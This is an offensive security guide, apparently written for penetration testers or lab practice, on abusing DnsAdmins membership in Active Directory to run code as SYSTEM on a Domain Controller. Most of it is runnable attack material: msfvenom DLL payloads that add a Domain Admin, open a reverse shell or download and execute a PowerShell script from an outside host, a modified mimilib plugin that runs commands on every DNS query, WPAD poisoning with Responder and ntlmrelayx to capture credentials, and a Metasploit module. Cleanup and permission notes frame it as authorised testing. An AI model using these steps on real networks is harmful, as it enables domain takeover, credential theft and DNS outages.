## DnsAdmins

The DnsAdmins group is a common and dangerous misconfiguration in Active Directory environments. Because the Windows DNS service supports custom plugin DLLs and runs as `NT AUTHORITY\SYSTEM` on Domain Controllers, members of this group can effectively execute arbitrary code as SYSTEM on the DC, which is equivalent to Domain Admin. [semperis](https://www.semperis.com/blog/dnsadmins-revisited/)

***

## How the Attack Works

The mechanism is a legitimate Windows DNS feature called `ServerLevelPluginDll`. The DNS management protocol (`dnscmd`) lets DnsAdmins members write an arbitrary DLL path into a registry key, and the DNS service loads that DLL on the next restart with no path validation: [phackt](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

```
DnsAdmins member runs dnscmd /config /serverlevelplugindll \\path\to\evil.dll
    |
    v
Registry key HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll
is populated with the DLL path
    |
    v
DNS service is restarted
    |
    v
DNS service (running as NT AUTHORITY\SYSTEM) loads and executes the DLL
    |
    v
Code inside the DLL runs as SYSTEM on the Domain Controller
```

***

## Attack 1: Malicious DLL to Add Domain Admin

### Step 1: Confirm DnsAdmins Membership

```powershell
# Confirm current user is in DnsAdmins
net localgroup DnsAdmins
whoami /groups | findstr DnsAdmins

# Enumerate DnsAdmins members from a domain account
Get-ADGroupMember -Identity DnsAdmins
```

### Step 2: Generate the Malicious DLL

```bash
# On attack machine
# Payload 1: Add user to Domain Admins
msfvenom -p windows/x64/exec cmd='net group "domain admins" hacker /add /domain' -f dll -o adduser.dll

# Payload 2: Reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o shell.dll

# Payload 3: Download and execute additional payload
msfvenom -p windows/x64/exec cmd='powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\")"' -f dll -o stage2.dll
```

### Step 3: Host the DLL

The DLL must be reachable by the DC's machine account. An SMB share is the most reliable delivery method since HTTP can be blocked:

```bash
# Option 1: SMB share (recommended - DC machine account can authenticate)
impacket-smbserver share . -smb2support
# DLL path to use: \\10.10.14.3\share\adduser.dll

# Option 2: Python HTTP server (may not work - DNS service uses machine account not user creds)
python3 -m http.server 7777
# Only works if the DLL is already on the target filesystem

# Option 3: Copy DLL to target first, then use local path
wget "http://10.10.14.3:7777/adduser.dll" -outfile "C:\Windows\Temp\adduser.dll"
# Use local path: C:\Windows\Temp\adduser.dll
```

### Step 4: Configure ServerLevelPluginDll

```cmd
:: Must be run as DnsAdmins member
:: FULL PATH is required - relative paths will not work

:: Using network share (DC machine account needs read access to the share)
dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll

:: Using local path (if DLL is already on the target)
dnscmd.exe /config /serverlevelplugindll C:\Windows\Temp\adduser.dll

:: Verify the registry key was written
reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

### Step 5: Check DNS Service Restart Permissions

```cmd
:: Get our SID first
wmic useraccount where name="netadm" get sid

:: Check DNS service SDDL - look for our SID with RPWP (start/stop permissions)
sc.exe sdshow DNS
:: Look for: (A;;RPWP;;;S-1-5-21-...-1109) where 1109 is our RID
:: RPWP = SERVICE_START (RP) + SERVICE_STOP (WP)
```

### Step 6: Restart DNS Service

```cmd
:: If you have start/stop permissions
sc stop dns
sc start dns

:: Remote restart (if running from attack machine with valid creds)
sc \\dc01.inlanefreight.local stop dns
sc \\dc01.inlanefreight.local start dns

:: Via PowerShell
Stop-Service -Name dns
Start-Service -Name dns
```

The DNS service will fail to start cleanly when loading a malicious DLL, but the payload runs before the failure. This means DNS will be briefly unavailable - coordinate with the client. 
### Step 7: Confirm Domain Admin Access

```cmd
net group "Domain Admins" /dom

:: If using reverse shell payload, ensure listener is running
:: On attack machine before restarting DNS:
nc -lnvp 8443
```

***

## Cleanup Steps

After the engagement, the DNS service will not start again until the registry key is removed:
```cmd
:: Step 1: Delete the ServerLevelPluginDll registry value
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f

:: Remote deletion (from attack machine as domain admin)
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f

:: Step 2: Start DNS service again
sc start dns

:: Step 3: Verify DNS is running and resolving
sc query dns
nslookup dc01.inlanefreight.local

:: Step 4: Remove backdoor user if one was added
net user hacker /delete /domain
```

***

## Attack 2: mimilib.dll (Logging All DNS Queries + Command Execution)

Mimikatz ships with `mimilib.dll`, a valid DNS plugin. You can modify `kdns.c` before compiling to execute any command on every DNS query. The advantage over a basic msfvenom DLL is that DNS keeps running normally because the plugin exports are valid: 

```c
// Modify kdns.c - replace the system() call
DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType,
    PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE *kdns_logfile;
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a")) {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);

        // Replace this line with your payload:
        system("net group \"Domain Admins\" hacker /add /domain");
        // Or:
        system("powershell -enc <base64_payload>");
    }
    return ERROR_SUCCESS;
}
```

```bash
# After modifying kdns.c, compile the mimilib project in Visual Studio
# Then deploy the compiled mimilib.dll via the same dnscmd method
dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\mimilib.dll
```

***

## Attack 3: WPAD Record for Credential Capture

This is a lower-impact but stealthier approach that does not require restarting the DNS service: 

```powershell
# Step 1: Disable the global query block list (prevents WPAD/ISATAP records from being blocked)
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

# Step 2: Add WPAD A record pointing to your attack machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local `
    -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

# Step 3: Start Responder or Inveigh on attack machine
# Every host configured to auto-detect proxy settings will now send requests to you
sudo responder -I tun0 -v
# Or use ntlmrelayx for relay attack instead of cracking
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Step 4: Clean up after engagement
Remove-DnsServerResourceRecord -ZoneName inlanefreight.local -RRType A -Name wpad -Force
Set-DnsServerGlobalQueryBlockList -Enable $true -ComputerName dc01.inlanefreight.local
```

***

## Metasploit Module

For environments where a Meterpreter session already exists:

```
msf6 > use exploit/windows/local/dnsadmin_serverlevelplugindll
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 8444
msf6 > set USERNAME netadm
msf6 > run
```

***

## Risk Assessment

This attack directly affects DNS resolution for the entire Active Directory domain. Treat it accordingly: 
```
Low impact path:    WPAD record   -> captures creds, DNS keeps running
Medium impact path: mimilib.dll   -> DNS keeps running, command executes on every query
High impact path:   msfvenom DLL  -> DNS stops working until DLL and registry key are cleaned up
```

Always obtain explicit written permission before restarting the DNS service on a production Domain Controller, and have the cleanup steps prepared before executing.
